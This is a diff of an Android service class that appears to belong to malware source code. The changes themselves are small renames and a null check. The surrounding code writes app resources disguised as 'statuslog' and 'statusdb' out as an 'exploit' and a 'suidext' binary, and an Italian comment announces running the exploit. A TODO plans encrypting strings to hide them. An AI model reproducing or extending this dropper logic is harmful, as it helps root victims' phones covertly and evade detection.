@@ -113,8 +113,10 @@ public class ServiceCore extends Service {
 			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
-		core.Stop();
-		core = null;
+		if (core != null) {
+			core.coreStop();
+			core = null;
+		}
 	}
 
 	@Override
@@ -157,7 +159,7 @@ public class ServiceCore extends Service {
 
 		// Core starts
 		core = Core.getInstance();
-		core.Start(this.getResources(), getContentResolver());
+		core.coreStart(this.getResources(), getContentResolver());
 	}
 
 	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
@@ -313,11 +315,11 @@ public class ServiceCore extends Service {
 
 			Resources resources = getResources();
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
-			//"0x5A3D10448D7A912B"
+			// "0x5A3D10448D7A912B"
 			fileWrite(exploit, stream, Messages.getString("36.1"));
 
 			stream = resources.openRawResource(R.raw.statusdb);
-			//0x5A3D10448D7A912A
+			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Messages.getString("36.2"));
 
 			// Eseguiamo l'exploit
